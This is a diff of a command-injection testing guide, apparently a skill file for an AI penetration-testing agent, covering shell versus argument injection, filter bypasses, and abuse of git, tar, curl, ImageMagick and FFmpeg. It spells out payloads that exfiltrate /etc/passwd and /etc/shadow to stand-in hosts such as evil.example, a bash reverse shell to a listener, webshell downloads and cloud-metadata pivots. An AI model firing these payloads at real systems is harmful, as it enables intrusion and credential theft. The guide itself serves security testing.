@@ -1,100 +1,284 @@
 ---
 name: command-injection
-description: OS command injection detection, exploitation, and filter bypass
+description: OS command injection and argument injection — detection, blind confirmation, filter bypass, and modern framework realities
 origin: AI Threat Hunting
 ---
 
-# OS Command Injection Testing
+# Command Injection Testing
 
 ## When to Activate
 
-- User input flows into system commands (ping, nslookup, file operations, PDF generation)
+- User input flows into system commands (file conversion, DNS lookup, ping, git operations, PDF generation, archive handling)
 - Application calls OS utilities with user-supplied arguments
-- Parameters that reference filenames, hostnames, IPs, or paths
+- Parameters that reference filenames, hostnames, IPs, URLs, or paths
+- Functionality powered by ImageMagick, FFmpeg, LibreOffice, wkhtmltopdf, Ghostscript, tar, or curl
+
+## Reality Check
+
+Command injection in 2025 lives in: file conversion endpoints (ImageMagick, FFmpeg, LibreOffice), DNS lookup/ping features, git operations, archive extraction (tar, unzip), and PDF generation. Classic `; id` in a search field is rare on modern frameworks. The high-value targets are argument injection in programs that have dangerous flags, and shell injection in glue code that pipes user input through bash to invoke external tools.
 
 ## Tools
 
 - `curl` / `wget` (manual requests)
 - Burp Suite Repeater + Intruder
-- Commix (automated command injection)
+- Commix (automated command injection — useful for initial sweep, but misses argument injection entirely)
 - Custom wordlists for injection payloads
 
-## Methodology
+---
 
-### 1. Identify Injection Points
+## Decision Tree: Shell Injection vs Argument Injection
 
-- [ ] Map all parameters that could reach OS commands
-- [ ] Look for functionality: DNS lookup, ping, traceroute, file conversion, mail
-- [ ] Check headers (Host, X-Forwarded-For) if processed server-side
+Before testing anything, determine how input reaches the OS command. This determines your entire attack surface.
 
-### 2. Basic Detection Payloads
+### Step 1: Does Input Reach a Shell?
 
-- [ ] Inline separators: `; id`, `| whoami`, `|| whoami`, `& whoami`, `&& id`
-- [ ] Backtick execution: `` `id` ``
-- [ ] Subshell: `$(whoami)`
-- [ ] Newline injection: `%0aid`, `%0a%0dwhoami`
-- [ ] Pipeline: `input | cat /etc/passwd`
+**Shell invocation** (exec/system/popen with shell=true):
+- PHP: `system()`, `exec()`, `passthru()`, `shell_exec()`, backticks
+- Python: `os.system()`, `subprocess.Popen(shell=True)`, `subprocess.run(shell=True)`
+- Node: `child_process.exec()`, `child_process.execSync()`
+- Ruby: `system()`, backticks, `%x{}`
+- Java: `Runtime.getRuntime().exec(String)` (single string = shell on some OSes)
 
-### 3. Blind Command Injection
+If shell = YES → full separator injection is viable. Proceed to Shell Injection.
 
-- [ ] Time-based: `; sleep 5` — measure response delay
-- [ ] Time-based (Windows): `& timeout /t 5`
-- [ ] DNS exfiltration: `; nslookup $(whoami).attacker.example`
-- [ ] HTTP callback: `; curl http://attacker.example/$(id | base64)`
-- [ ] File write then read: `; id > /var/www/html/output.txt`
+**Direct execution** (execve/spawn, no shell):
+- Python: `subprocess.run(["cmd", arg], shell=False)` (the default)
+- Node: `child_process.execFile()`, `child_process.spawn()`
+- Java: `ProcessBuilder`, `Runtime.exec(String[])` (array form)
+- Go: `exec.Command()`
 
-### 4. Filter Bypass Techniques
+If direct exec = YES → no separators work. Argument injection only. Skip to Argument Injection.
 
-- [ ] Space bypass: `$IFS` → `cat$IFS/etc/passwd`
-- [ ] Space bypass: `${IFS}` → `cat${IFS}/etc/passwd`
-- [ ] Space bypass: `%09` (tab), `{cat,/etc/passwd}`
-- [ ] Wildcard bypass: `/???/??t /???/p??s??` (for `cat /etc/passwd`)
-- [ ] Quote bypass: `w"h"o"a"mi`, `w'h'o'a'mi`
-- [ ] Backslash: `w\ho\am\i`
-- [ ] Variable concat: `a=who;b=ami;$a$b`
-- [ ] URL encoding: `%26`, double-encoding `%2526`
-- [ ] Hex/octal encoding in `printf` or `$'\x77\x68\x6f\x61\x6d\x69'`
+### Step 2: What Shell Is Running?
 
-### 5. Windows-Specific
+This matters more than most testers realize:
+- **bash** — `$IFS`, `${IFS}`, brace expansion `{cat,/etc/passwd}`, `$'\x77'` hex escapes all work
+- **sh/dash** (common in Docker Alpine, Ubuntu minimal) — `$IFS` works but `${IFS}` may not, brace expansion does NOT work, hex escapes do NOT work
+- **Windows cmd.exe** — `&`, `|`, `&&`, `||` separators; `^` for character escaping; environment variable slicing for character construction
 
-- [ ] Separators: `&`, `&&`, `|`, `||`
-- [ ] Command: `& dir`, `| type C:\windows\win.ini`
-- [ ] Bypass: `^` caret insertion → `w^h^o^a^m^i`
-- [ ] Env variable slicing: `%COMSPEC:~6,1%%COMSPEC:~23,1%` extracts chars from `C:\WINDOWS\system32\cmd.exe`
-- [ ] Alternative: `set /a` arithmetic, `for /F` token extraction to build commands from env
+**How to identify**: inject `echo $0` or `echo $SHELL` if you have output. Blind: test bash-only features (brace expansion) — if they fail but simpler payloads work, you're on sh/dash.
 
-### 6. Exploitation
+---
 
-- [ ] Read sensitive files: `/etc/passwd`, `/etc/shadow`, config files
+## Shell Injection
+
+### Separator Selection
+
+Do not spray all separators blindly. Choose based on context:
+
+| Separator | When to Use | Notes |
+|-----------|-------------|-------|
+| `\n` (%0a) | **Try first** — most overlooked separator, bypasses many filters | Works in bash, sh, and most contexts. Especially effective in multiline string contexts |
+| `;` | Cleanest separator, most portable | Heavily filtered — try only if newlines fail |
+| `\|` | When output might be piped back | Requires the first command to produce stdout |
+| `&&` | When you need the first command to succeed | URL-encode as `%26%26` |
+| `$()` | Inside string interpolation contexts | `$(whoami)` — works in double-quoted strings |
+| `` ` `` | Alternative to `$()` for older systems | Backticks — harder to nest but sometimes less filtered |
+
+### Filter Bypass: When to Use What
+
+**Spaces blocked:**
+- `$IFS` → `cat$IFS/etc/passwd` — works on bash. On sh/dash, test first: some builds treat `$IFS` differently
+- `${IFS}` → more explicit, bash-reliable
+- Tab (`%09`) → works universally, often overlooked in filters
+- Brace expansion → `{cat,/etc/passwd}` — bash ONLY, not sh/dash
+
+**Semicolons blocked:**
+- Newline `%0a` — most overlooked separator. Try this before anything else
+- `&&` / `||` — often unfiltered when `;` is blocked
+- `$()` or backticks — command substitution, not technically a separator
+
+**Keywords blocked (cat, whoami, etc.):**
+- Quote insertion: `w"h"o"a"mi`, `w'h'o'a'mi` — shell strips quotes before execution
+- Backslash: `w\ho\am\i`
+- Variable concatenation: `a=who;b=ami;$a$b`
+- Wildcards: `/???/??t /???/p??s??` → `cat /etc/passwd` — useful when alphanumeric filtering is aggressive
+- `printf`: `$(printf '\x63\x61\x74') /etc/passwd`
+
+**URL/encoding layers:**
+- Single URL encode: `%26` for `&`
+- Double encode: `%2526` — bypasses WAFs that decode once before checking
+- Unicode normalization: rare but seen in Java apps that normalize before shell execution
+
+### Windows-Specific
+
+- Separators: `&`, `&&`, `|`, `||` (NOT `;` — cmd.exe does not support it)
+- Character bypass: `^` caret insertion → `w^h^o^a^m^i`
+- Env variable slicing: `%COMSPEC:~6,1%` extracts characters from `C:\WINDOWS\system32\cmd.exe` — build arbitrary strings from environment
+- PowerShell context: `; Invoke-WebRequest` or `$()` subexpression — different rules than cmd.exe
+
+---
+
+## Argument Injection
+
+**This is more common than OS command injection in modern apps.** When input is passed as an argument to a program (not through a shell), separators do nothing. Instead, you inject additional flags.
+
+### Gate Question
+
+Does the application pass user input as an argument to a program that has dangerous flags? If yes, argument injection may yield file read, file write, SSRF, or RCE without any shell involvement.
+
+### Git Argument Injection
+
+Git operations are everywhere — CI/CD, code review tools, deployment scripts, version-tagged APIs.
+
+- `--upload-pack` — inject arbitrary command execution during `git clone` or `git fetch`:
+  ```
+  --upload-pack='$(id>/tmp/pwned)'
+  ```
+- `--config` — override git configuration at runtime:
+  ```
+  -c core.sshCommand='curl http://evil.example/$(whoami)'
+  ```
+- `--template` — specify template directory for `git init`, enables arbitrary hooks
+- `ext::` remote — `git clone ext::'curl attacker.example/$(cat /etc/passwd)'`
+
+**Kill signal**: if the app uses `git clone --` with `--` before the URL argument, flag injection is blocked.
+
+### ImageMagick Delegate Injection
+
+ImageMagick processes images by delegating to external programs based on file format. Controlled filenames or format specifiers can trigger delegate execution.
+
+- MSL (ImageMagick Scripting Language): upload XML disguised as image → file read/write
+- SVG with embedded `<image>` tags → SSRF via `url()` references
+- `ephemeral:` / `msl:` pseudo-protocols → read/write arbitrary files
+- Filename injection: `|id > /tmp/pwned` as filename in older versions (CVE-2016-3714 lineage)
+
+**Real-world pattern**: image upload endpoint → ImageMagick convert → delegate execution → RCE or file read.
+
+### FFmpeg SSRF and File Read
+
+FFmpeg processes media files and follows protocol handlers. This is SSRF, not traditional command injection.
+
+- **m3u8 playlist injection**: upload m3u8 containing `file:///etc/passwd` or `http://internal-service/`
+- **concat protocol**: `concat:http://internal:8080/admin|file:///etc/passwd`
+- **HLS**: craft m3u8 with `#EXT-X-MAP:URI="file:///etc/passwd"` → file contents appear in transcoded output
+- **SSRF via subtitle injection**: embedded subtitles with HTTP URLs → server-side requests
+
+**Real-world pattern**: video upload → FFmpeg transcode → attacker-crafted playlist → internal network access.
+
+### tar Argument Injection
+
+Archive extraction with user-controlled filenames or arguments:
+
+- `--checkpoint-action=exec=CMD` — execute arbitrary command at archive extraction
+- `--to-command=CMD` — pipe extracted file content through command
+- `--use-compress-program=CMD` — specify arbitrary compression program
+
+**Real-world pattern**: backup/restore feature, file upload that auto-extracts archives.
+
+### curl/wget Argument Injection
+
+If user input reaches curl/wget arguments:
+
+- `curl -o /var/www/html/shell.php http://evil.example/shell.php` — write webshell
+- `curl -T /etc/passwd http://evil.example/` — exfiltrate files
+- `wget --post-file=/etc/shadow http://evil.example/` — POST file contents to attacker
+
+### Generic Defense Bypass
+
+If the application adds `--` before user input (proper argument termination):
+- Argument injection is blocked for everything after `--`
+- But check: is `--` actually before your input? Many implementations put it in the wrong position
+- Some programs have positional arguments with dangerous behavior even after `--`
+
+---
+
+## Blind Detection
+
+### The Baseline Problem
+
+Sleep-based detection is unreliable in noisy networks. A 5-second payload that adds 5 seconds to a response that normally varies by 3 seconds is meaningless.
+
+**Reliable blind detection protocol:**
+
+1. **Establish baseline**: send 3 identical legitimate requests. Record response times. Calculate normal variance.
+2. **Short sleep**: inject `sleep 5`. Send 3 times. If all 3 show consistent ~5s delta above baseline → promising.
+3. **Differential confirmation**: inject `sleep 10`. If delta is consistently ~10s (double the previous) → confirmed. A timing-only result that does not show this differential pattern is not confirmed.
+4. **False positive check**: if the app is slow due to processing (heavy page, file upload), the "delay" may be application logic, not injection.
+
+### DNS-Based (Most Reliable Blind Confirmation)
+
+DNS callbacks are the most reliable blind confirmation because they are out-of-band and binary (hit or no hit).
+
+```bash
+# Subshell
+$(nslookup $OOB_URL)
+# Backtick
+`nslookup $OOB_URL`
+# With data exfil
+$(nslookup $(whoami).$OOB_URL)
+# Without nslookup (dig may be available when nslookup is not)
+$(dig $OOB_URL)
+# curl-based OOB (if DNS tools are stripped)
+$(curl http://$OOB_URL/)
+```
+
+If `$DIR/.oob_url` is available, use the provisioned callback URL. If not, fall back to timing, and request OOB infrastructure from the operator if timing is ambiguous.
+
+### File Creation + Read-Back
+
+When you have a separate file read or SSRF vulnerability:
+
+```bash
+$(id > /tmp/ci_test_$(date +%s))
+$(cat /etc/passwd > /var/www/html/uploads/test.txt)
+```
+
+Then read the file through the other vulnerability. This provides both confirmation and output.
+
+---
+
+## What Modern Frameworks Block (And What Still Works)
+
+### Python subprocess with shell=False (the default)
+
+- Blocks: ALL separators (`;`, `|`, `&&`, `\n`, backticks, `$()`)
+- Still works: argument injection — you control one argument to the target program, so dangerous flags are viable
+- Common mistake: developer uses `shell=True` "because the command didn't work otherwise" — search for `shell=True` in source
+
+### Node child_process.execFile / spawn
+
+- Blocks: same as Python shell=False — no shell expansion
+- Still works: argument injection against the target program
+- Common mistake: `child_process.exec()` (NOT execFile) uses shell — one function name difference
+
+### PHP escapeshellarg
+
+- Blocks: most injection — wraps input in single quotes, escapes embedded quotes
+- Still works: locale-dependent bypass (CVE-2024-4577) — on Windows with certain PHP-CGI configurations, `%AD` soft hyphen bypasses argument parsing entirely → RCE
+- Still works: if the escaped argument is used as a filename, path traversal may still be viable
+
+### Go os/exec
+
+- Blocks: shell injection entirely — `exec.Command` never invokes a shell
+- Still works: argument injection if user input is passed as arguments
+- Common mistake: using `exec.Command("bash", "-c", userInput)` — intentionally invoking shell, defeats the protection
+
+### Ruby
+
+- `system("cmd #{input}")` — shell injection, fully vulnerable
+- `system("cmd", input)` — multi-arg form, safe from shell injection, argument injection only
+- `Open3.capture3("cmd", input)` — same as multi-arg system
+
+---
+
+## Exploitation
+
+Once injection is confirmed:
+
+- [ ] Read sensitive files: `/etc/passwd`, `/etc/shadow`, application config files, `.env`, database credentials
 - [ ] Establish reverse shell (MANUAL listener required — see `references/offensive-tactics/shell-handling.md`):
       `; bash -i >& /dev/tcp/LISTENER_HOST/LISTENER_PORT 0>&1`
-- [ ] Enumerate internal network: `; ifconfig`, `; cat /etc/hosts`
-- [ ] Pivot: `; curl http://internal-service/`
+- [ ] Enumerate internal network: `ifconfig`/`ip addr`, `cat /etc/hosts`, `env` (for cloud metadata URLs, internal service addresses)
+- [ ] Pivot: `curl http://169.254.169.254/latest/meta-data/` (cloud metadata), `curl http://internal-service/`
+- [ ] Container detection: `cat /proc/1/cgroup`, `ls /.dockerenv` — if containerized, the RCE scope may be limited
 
-### 7. Argument Injection
-
-When input is passed as an argument to a program (not through shell), test flag injection:
-- [ ] `--output=/tmp/evil` or `-o /tmp/evil` — write to attacker-controlled path
-- [ ] `--config=http://attacker.example/evil.conf` — load remote config
-- [ ] Programs with dangerous flags: `tar --checkpoint-action=exec=CMD`, `git -c core.sshCommand=CMD`, `curl -o /tmp/shell.php http://evil/`, `rsync -e 'ssh -o ProxyCommand=CMD'`, `find -exec CMD`
-- [ ] Prefix with `--` to terminate option parsing, then inject as positional arg
-
-### 8. Context-Specific Checks
-
-- [ ] Inside quotes: escape with `"`, then inject
-- [ ] Inside `$(...)`: nest commands
-- [ ] Restricted shell: check available commands, PATH manipulation
-
-## What to Record
-
-- Exact parameter and endpoint vulnerable
-- Payload used (including encoding)
-- Command output or timing difference observed
-- OS and shell type confirmed
-- Whether blind or reflected
-- Filter/WAF bypass technique required
-- Severity: Critical (RCE achieved) or High (blind confirmed)
-- Remediation: use allowlists, parameterized APIs, avoid shell calls
+## Kill Signals — Stop Testing When
+- Application uses execve/spawn (no shell) confirmed by lack of separator-based injection → switch to argument injection section only
+- Framework uses subprocess with shell=False (Python), execFile (Node), or multi-arg system (Ruby) → classic injection blocked, test argument injection only
+- All separator and encoding bypasses fail after 10+ attempts → input is sanitized, move on
+- Blind detection via sleep AND DNS both fail with no timing delta → no injection path, move on
+- RCE confirmed via any method → CRITICAL, record finding, stop testing other injection vectors
 
 ## Extended Resources
 
